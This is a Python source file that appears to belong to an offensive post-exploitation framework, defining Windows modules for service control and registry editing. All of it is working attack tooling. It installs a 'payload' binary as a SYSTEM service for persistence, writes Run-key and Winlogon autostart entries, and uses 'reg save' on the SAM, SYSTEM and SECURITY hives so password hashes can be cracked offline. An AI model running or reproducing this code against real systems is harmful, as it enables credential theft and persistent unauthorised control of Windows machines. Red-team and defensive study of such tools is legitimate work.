"""SYSTEM-level Windows: services, registry, and hive copies for cracking.

``windows.persist`` survives a logoff as the user; a service survives it as
``LocalSystem``. This pair is the difference:

* ``windows.service`` — list what runs at boot, install/start/stop/remove one,
  and ``reg save`` the SAM/SYSTEM/SECURITY hives so they can be attacked
  offline with the hashes already on disk;
* ``windows.reg`` — read, write or delete registry values (Run keys, policy
  keys, the ``Winlogon`` shell) without a PowerShell round-trip.

Both are argv/winreg only: nothing to copy onto the target.
"""

from __future__ import annotations

import os

from omni.core import config, console
from omni.core.module import Option
from omni.windows import services
from omni.windows.modules._base import WindowsModule

__all__ = ["Service", "Registry", "RUN_KEY", "ROOTS"]

#: where the per-user autostart actually lives
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"

#: registry path prefix -> winreg hive constant name
ROOTS = {"HKLM": "HKEY_LOCAL_MACHINE",
         "HKEY_LOCAL_MACHINE": "HKEY_LOCAL_MACHINE",
         "HKCU": "HKEY_CURRENT_USER",
         "HKEY_CURRENT_USER": "HKEY_CURRENT_USER",
         "HKCR": "HKEY_CLASSES_ROOT",
         "HKEY_CLASSES_ROOT": "HKEY_CLASSES_ROOT",
         "HKU": "HKEY_USERS", "HKEY_USERS": "HKEY_USERS"}


class Service(WindowsModule):
    NAME = "windows.service"
    DESCRIPTION = "List/install/control services and copy the registry hives"
    OPTIONS = (Option("ACTION", "list|query|install|start|stop|remove|hives",
                       "list",
                       choices=("list", "query", "install", "start", "stop",
                                "remove", "hives")),
               Option("SERVICE", "service name"),
               Option("BINARY", "executable path for ACTION=install"),
               Option("START", "start type: boot|system|auto|demand|disabled",
                      "auto"),
               Option("GREP", "only rows containing this text"),
               Option("LIMIT", "rows to print", "40"),
               Option("OUT", "directory for ACTION=hives"),
               Option("HIVES", "comma list: sam,system,security,software"))

    @staticmethod
    def _rows(rows: list[dict]) -> list[list[str]]:
        return [[row.get("service_name", "")[:34],
                 row.get("state", "")[:26],
                 row.get("start_type", row.get("type", ""))[:18]]
                for row in rows]

    def execute(self) -> dict:
        action = self.get("ACTION")
        name = self.get("SERVICE").strip()
        if action == "list":
            rows = services.query()
            needle = self.get("GREP").strip().lower()
            if needle:
                rows = [row for row in rows
                        if needle in " ".join(row.values()).lower()]
            limit = max(1, self.get_int("LIMIT", 40))
            console.table(["service", "state", "start"],
                          self._rows(rows[:limit]))
            console.ok(f"{len(rows)} service(s)")
            return {"services": rows}

        if action == "hives":
            out = os.path.expanduser(
                self.get("OUT") or config.output_dir("windows/hives"))
            wanted = [hive.strip() for hive in self.get("HIVES").split(",")
                      if hive.strip()] or None
            return {"hives": services.save_hives(out, wanted)}

        if not name:
            raise ValueError(f"ACTION={action} needs SERVICE")
        if action == "install":
            binary = self.get("BINARY").strip()
            if not binary:
                raise ValueError("ACTION=install needs BINARY (the payload)")
            res = services.install(name, binary, self.get("START") or "auto")
            return {"installed": res.ok, "service": name,
                    "detail": res.text[:200]}
        if action == "start":
            res = services.start(name)
            return {"started": res.ok, "service": name,
                    "detail": res.text[:200]}
        if action == "stop":
            res = services.stop(name)
            return {"stopped": res.ok, "service": name,
                    "detail": res.text[:200]}
        if action == "remove":
            res = services.remove(name)
            return {"removed": res.ok, "service": name,
                    "detail": res.text[:200]}

        rows = services.query(name)
        console.table(["service", "state", "start"], self._rows(rows))
        if not rows:
            console.warn(f"no service named {name!r}")
        return {"service": name, "rows": rows}


class Registry(WindowsModule):
    NAME = "windows.reg"
    DESCRIPTION = "Read, write or delete registry values (and save hives)"
    OPTIONS = (Option("ACTION", "query|get|set|delete|save", "query",
                       choices=("query", "get", "set", "delete", "save")),
               Option("KEY", "key path, e.g. HKCU\\Software\\...", RUN_KEY),
               Option("VALUE", "value name"),
               Option("DATA", "data for ACTION=set"),
               Option("HIVE", "hive for ACTION=save (sam|system|...)", "sam"),
               Option("OUT", "output directory for ACTION=save"),
               Option("LIMIT", "rows to print", "40"))

    @staticmethod
    def split(path: str):
        """``HKCU\\Software\\X`` -> (winreg hive constant, ``Software\\X``).

        A path without a hive prefix is a *current user* path — that is what
        ``KEY=Software\\...\\Run`` means to anybody typing it — but a
        misspelled hive (``HKXZ\\...``) is an error rather than a guess.
        """
        head, _, _rest = (path or "").strip().partition("\\")
        name = ROOTS.get(head.upper())
        import winreg                                # noqa: PLC0415
        if name is None:
            if head.upper().startswith("HK"):
                raise ValueError(f"KEY starts with an unknown hive "
                                 f"{head!r} — use "
                                 f"{', '.join(sorted(ROOTS))}")
            return winreg.HKEY_CURRENT_USER, (path or "").strip()
        return getattr(winreg, name), (path or "").strip().partition("\\")[2]

    def execute(self) -> dict:
        import winreg                                # noqa: PLC0415
        action = self.get("ACTION")
        if action == "save":
            out = os.path.expanduser(
                self.get("OUT") or config.output_dir("windows/hives"))
            return {"hives": services.save_hives(out,
                                                 [self.get("HIVE") or "sam"])}

        hive, subkey = self.split(self.get("KEY") or RUN_KEY)
        if action == "query":
            rows: list[list[str]] = []
            try:
                with winreg.OpenKey(hive, subkey) as key:
                    index = 0
                    while True:
                        try:
                            name, data, kind = winreg.EnumValue(key, index)
                        except OSError:
                            break
                        rows.append([name[:36], str(kind), str(data)[:60]])
                        index += 1
            except FileNotFoundError:
                console.warn(f"no such key: {self.get('KEY')}")
                return {"values": []}
            console.table(["value", "type", "data"],
                          rows[:max(1, self.get_int("LIMIT", 40))])
            console.ok(f"{len(rows)} value(s) under {self.get('KEY')}")
            return {"key": self.get("KEY"), "values": rows}

        if action == "get":
            with winreg.OpenKey(hive, subkey) as key:
                data, kind = winreg.QueryValueEx(key, self.get("VALUE"))
            console.info(f"{self.get('VALUE')} = {data!r} (type {kind})")
            return {"value": self.get("VALUE"), "data": str(data),
                    "type": kind}

        if action == "set":
            if not self.get("VALUE"):
                raise ValueError("ACTION=set needs VALUE")
            with winreg.CreateKey(hive, subkey) as key:
                winreg.SetValueEx(key, self.get("VALUE"), 0, winreg.REG_SZ,
                                   self.get("DATA"))
            console.ok(f"{self.get('KEY')}\\{self.get('VALUE')} = "
                       f"{self.get('DATA')!r}")
            return {"set": self.get("VALUE"), "data": self.get("DATA")}

        if not self.get("VALUE"):
            raise ValueError("ACTION=delete needs VALUE")
        with winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, self.get("VALUE"))
        console.warn(f"deleted {self.get('VALUE')} from {self.get('KEY')}")
        return {"deleted": self.get("VALUE")}

